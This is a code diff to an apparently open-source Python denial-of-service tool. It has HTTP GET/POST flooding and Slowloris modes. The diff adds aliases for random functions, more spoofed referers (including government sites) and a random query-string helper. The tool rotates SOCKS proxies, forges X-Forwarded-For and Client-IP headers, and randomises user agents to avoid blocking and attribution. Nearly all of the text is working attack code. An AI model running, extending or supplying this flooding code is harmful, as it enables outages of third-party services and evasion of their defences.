@@ -18,6 +18,7 @@ import threading
 import sys
 import ssl
 import datetime
+#import multiprocessing #i'm working on it
 
 
 print ('''
@@ -66,82 +67,102 @@ referers = [
 	"https://www.fbi.com/",
 	"https://www.bing.com/search?q=",
 	"https://r.search.yahoo.com/",
+	"https://www.cia.gov/index.html",
+	"https://www.police.gov.hk/",
+	"https://www.mjib.gov.tw/",
+	"https://www.president.gov.tw/",
+	"https://www.gov.hk",
+	"https://vk.com/profile.php?redirect=",
+	"https://www.usatoday.com/search/results?q=",
+	"https://help.baidu.com/searchResult?keywords=",
+	"https://steamcommunity.com/market/search?q=",
+	"https://www.ted.com/search?q=",
+	"https://play.google.com/store/search?q=",
 ]
 data = ""
 cookies = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
+###################################################
+Intn = random.randint#idk but it looks like can reduce some cpu usage and time.
+Choice = random.choice
+setsocks = socks.setdefaultproxy
+###################################################
 def getuseragent():
-    platform = random.choice(['Macintosh', 'Windows', 'X11'])
+    platform = Choice(['Macintosh', 'Windows', 'X11'])
     if platform == 'Macintosh':
-        os  = random.choice(['68K', 'PPC', 'Intel Mac OS X'])
+        os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
     elif platform == 'Windows':
-        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
+        os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
     elif platform == 'X11':
-        os  = random.choice(['Linux i686', 'Linux x86_64'])
-    browser = random.choice(['chrome', 'firefox', 'ie'])
+        os  = Choice(['Linux i686', 'Linux x86_64'])
+    browser = Choice(['chrome', 'firefox', 'ie'])
     if browser == 'chrome':
-        webkit = str(random.randint(500, 599))
-        version = str(random.randint(0, 99)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
+        webkit = str(Intn(500, 599))
+        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
         return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
     elif browser == 'firefox':
         currentYear = datetime.date.today().year
-        year = str(random.randint(2020, currentYear))
-        month = random.randint(1, 12)
+        year = str(Intn(2020, currentYear))
+        month = Intn(1, 12)
         if month < 10:
             month = '0' + str(month)
         else:
             month = str(month)
-        day = random.randint(1, 30)
+        day = Intn(1, 30)
         if day < 10:
             day = '0' + str(day)
         else:
             day = str(day)
         gecko = year + month + day
-        version = str(random.randint(1, 72)) + '.0'
+        version = str(Intn(1, 72)) + '.0'
         return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
     elif browser == 'ie':
-        version = str(random.randint(1, 99)) + '.0'
-        engine = str(random.randint(1, 99)) + '.0'
-        option = random.choice([True, False])
+        version = str(Intn(1, 99)) + '.0'
+        engine = str(Intn(1, 99)) + '.0'
+        option = Choice([True, False])
         if option == True:
-            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
+            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
         else:
             token = ''
         return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
+
+def randomurl():
+	 return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
+
 def cc(socks_type):
 	connection = "Connection: Keep-Alive\r\n"
 	if cookies != "":
 		connection += "Cookies: "+str(cookies)+"\r\n"
 	err = 0
-	if str(port) == "443" :
+	if port == 443 :
 		n = "HTTPS"
 	else:
 		n = "CC"
 	while True:
-		fake_ip = "X-Forwarded-For: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
-		fake_ip += "Client-IP: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
-		accept = random.choice(acceptall)
-		referer = "Referer: "+random.choice(referers)+ ip + url2 + "\r\n"
+		fake_ip = "X-Forwarded-For: "+str(Intn(1,255))+"."+str(Intn(0,255))+"."+str(Intn(0,255))+"."+str(Intn(0,255))+"\r\n"
+		fake_ip += "Client-IP: "+str(Intn(1,255))+"."+str(Intn(0,255))+"."+str(Intn(0,255))+"."+str(Intn(0,255))+"\r\n"
+		accept = Choice(acceptall)
+		referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
 		try:
-			proxy = random.choice(proxies).strip().split(":")
+			proxy = Choice(proxies).strip().split(":")
 			if socks_type == 4:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 			if socks_type == 5:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+				setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 10:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
 			s = socks.socksocket()
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.connect((str(ip), int(port)))
-			if str(port) == '443':
+			if port == 443:
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=ip)
 			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					useragent = "User-Agent: " +getuseragent() + "\r\n"
-					get_host = "GET " + url2 + "?" + random.choice(strings)+str(random.randint(0,271400281257))+random.choice(strings)+str(random.randint(0,271004281257))+random.choice(strings) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 					request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
 					s.send(str.encode(request))
 				s.close()
@@ -158,26 +179,26 @@ def post(socks_type):
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
 	refer = "Referer: http://"+ ip + url2 + "\r\n"
 	user_agent = "User-Agent: " + getuseragent() + "\r\n"
-	accept = random.choice(acceptall)
+	accept = Choice(acceptall)
 	if mode2 != "y":
 		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
 	length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
 	if cookies != "":
 		length += "Cookies: "+str(cookies)+"\r\n"
 	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
-	proxy = random.choice(proxies).strip().split(":")
+	proxy = Choice(proxies).strip().split(":")
 	err = 0
-	if str(port) == "443" :
+	if port == 443 :
 		n = "HTTPS"
 	else:
 		n = "CC"
 	while True:
 		try:
-			proxy = random.choice(proxies).strip().split(":")
+			proxy = Choice(proxies).strip().split(":")
 			if socks_type == 4:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 			if socks_type == 5:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+				setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 10:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
@@ -203,11 +224,11 @@ def post(socks_type):
 socket_list=[]
 def slow(conn,socks_type):
 	try:#dirty fix
-		proxy = random.choice(proxies).strip().split(":")
+		proxy = Choice(proxies).strip().split(":")
 		if socks_type == 4:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 		if socks_type == 5:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	except:
 		print("[!] Something wrong in socks list")
 		slow(conn,socks_type)#restart
@@ -220,7 +241,7 @@ def slow(conn,socks_type):
 			if str(port) == '443':
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=ip)
-			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
+			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
 			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
 			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 			if cookies != "":
@@ -232,17 +253,17 @@ def slow(conn,socks_type):
 			sys.stdout.flush()
 		except:
 			s.close()
-			proxy = random.choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
+			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
 			if socks_type == 4:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 			if socks_type == 5:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+				setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 	while True:
 		for s in list(socket_list):
 			try:
-				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+				s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
@@ -250,11 +271,11 @@ def slow(conn,socks_type):
 				socket_list.remove(s)
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
-		proxy = random.choice(proxies).strip().split(":")
+		proxy = Choice(proxies).strip().split(":")
 		if socks_type == 4:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 		if socks_type == 5:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 		for _ in range(conn - len(socket_list)):
 			try:
 				s.settimeout(1)
@@ -262,7 +283,7 @@ def slow(conn,socks_type):
 				if str(port) == '443':
 					ctx = ssl.SSLContext()
 					s = ctx.wrap_socket(s,server_hostname=ip)
-				s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
+				s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
 				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
 				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 				if cookies != "":
@@ -272,11 +293,11 @@ def slow(conn,socks_type):
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
-				proxy = random.choice(proxies).strip().split(":")
+				proxy = Choice(proxies).strip().split(":")
 				if socks_type == 4:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+					setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 				if socks_type == 5:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+					setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 				pass
@@ -287,9 +308,9 @@ def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 	try:#dirty fix
 		proxy = lines.strip().split(":")
 		if socks_type == 4:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 		if socks_type == 5:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	except:
 		proxies.remove(lines)
 		return
